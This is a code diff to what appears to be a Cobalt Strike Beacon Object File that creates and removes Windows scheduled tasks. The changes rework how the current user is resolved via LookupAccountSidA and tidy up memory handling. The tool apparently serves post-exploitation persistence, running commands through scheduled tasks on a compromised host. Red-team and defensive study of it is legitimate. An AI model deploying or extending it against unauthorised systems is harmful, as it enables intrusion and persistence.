@@ -27,23 +27,6 @@ BSTR charToBSTR(const char *input) {
     return bstr;
 }
 
-// Retrieves the current user's name in the specified format
-char *GetUser(EXTENDED_NAME_FORMAT NameFormat) {
-    char *UsrBuf = intAlloc(MAX_PATH);
-    ULONG UsrSiz = MAX_PATH;
-
-    if (UsrBuf == NULL) {
-        return NULL;
-    }
-
-    if (SECUR32$GetUserNameExA(NameFormat, UsrBuf, &UsrSiz)) {
-        return UsrBuf;
-    }
-
-    intFree(UsrBuf);
-    return NULL;
-}
-
 // Retrieves token information for the current process
 VOID *GetTokenInfo(TOKEN_INFORMATION_CLASS TokenType) {
     HANDLE hToken = 0;
@@ -72,30 +55,93 @@ VOID *GetTokenInfo(TOKEN_INFORMATION_CLASS TokenType) {
     return pTokenInfo;
 }
 
-// Retrieves user information and stores it in userStr
+// Retrieves the current user as DOMAIN\\username from the process token.
 void GetUserInfo(char **userStr) {
     PTOKEN_USER pUserInfo = NULL;
-    *userStr = NULL;
+    SID_NAME_USE sidType;
+    DWORD userLen = 0;
+    DWORD domainLen = 0;
+    char *userName = NULL;
+    char *domainName = NULL;
+    DWORD totalLen = 0;
 
+    if (userStr == NULL) {
+        return;
+    }
+
+    *userStr = NULL;
     pUserInfo = (PTOKEN_USER)GetTokenInfo(TokenUser);
     if (pUserInfo == NULL) {
         BeaconPrintf(CALLBACK_ERROR, "Failed to get token information.\n");
         return;
     }
 
-    *userStr = GetUser(NameSamCompatible);
-    if (*userStr == NULL) {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to get user name.\n");
-    }
+    // First call obtains the required buffer sizes.
+    ADVAPI32$LookupAccountSidA(
+        NULL,
+        pUserInfo->User.Sid,
+        NULL,
+        &userLen,
+        NULL,
+        &domainLen,
+        &sidType
+    );
 
-    if (pUserInfo) {
+    if (userLen == 0) {
+        BeaconPrintf(CALLBACK_ERROR, "Failed to determine the current user name size: %lu\n", KERNEL32$GetLastError());
         intFree(pUserInfo);
+        return;
     }
 
-    if (*userStr == NULL && *userStr) {
-        intFree(*userStr);
-        *userStr = NULL;
+    userName = intAlloc(userLen);
+    if (domainLen > 0) {
+        domainName = intAlloc(domainLen);
     }
+
+    if (userName == NULL || (domainLen > 0 && domainName == NULL)) {
+        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for the current user name.\n");
+        if (userName) intFree(userName);
+        if (domainName) intFree(domainName);
+        intFree(pUserInfo);
+        return;
+    }
+
+    if (!ADVAPI32$LookupAccountSidA(
+            NULL,
+            pUserInfo->User.Sid,
+            userName,
+            &userLen,
+            domainName,
+            &domainLen,
+            &sidType)) {
+        BeaconPrintf(CALLBACK_ERROR, "LookupAccountSidA failed: %lu\n", KERNEL32$GetLastError());
+        intFree(userName);
+        if (domainName) intFree(domainName);
+        intFree(pUserInfo);
+        return;
+    }
+
+    if (domainName != NULL && domainName[0] != '\0') {
+        totalLen = (DWORD)MSVCRT$strlen(domainName) + (DWORD)MSVCRT$strlen(userName) + 2;
+        *userStr = intAlloc(totalLen);
+        if (*userStr != NULL) {
+            MSVCRT$_snprintf(*userStr, totalLen, "%s\\%s", domainName, userName);
+        }
+    } else {
+        totalLen = (DWORD)MSVCRT$strlen(userName) + 1;
+        *userStr = intAlloc(totalLen);
+        if (*userStr != NULL) {
+            MSVCRT$_snprintf(*userStr, totalLen, "%s", userName);
+        }
+    }
+
+    if (*userStr == NULL) {
+        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate the formatted current user name.\n");
+    }
+
+    intFree(userName);
+    if (domainName) intFree(domainName);
+    intFree(pUserInfo);
 }
 
 // Removes a scheduled task
@@ -211,6 +257,15 @@ DWORD createTask(char *taskName, char *command) {
     }
 
     GetUserInfo(&userStr);
+    if (userStr == NULL) {
+        BeaconPrintf(CALLBACK_ERROR, "Cannot create the task without resolving the current user.\n");
+        pTask->lpVtbl->Release(pTask);
+        pRootFolder->lpVtbl->Release(pRootFolder);
+        pService->lpVtbl->Release(pService);
+        OLEAUT32$SysFreeString(rootFolderPath);
+        OLE32$CoUninitialize();
+        return ERROR_NONE_MAPPED;
+    }
 
     IPrincipal *pPrincipal = NULL;
     hr = pTask->lpVtbl->get_Principal(pTask, &pPrincipal);
@@ -350,7 +405,7 @@ DWORD createTask(char *taskName, char *command) {
     OLEAUT32$SysFreeString(userBstr);
     OLEAUT32$SysFreeString(rootFolderPath);
     if (userStr) {
-        KERNEL32$LocalFree(userStr);
+        intFree(userStr);
     }
     OLE32$CoUninitialize();
 
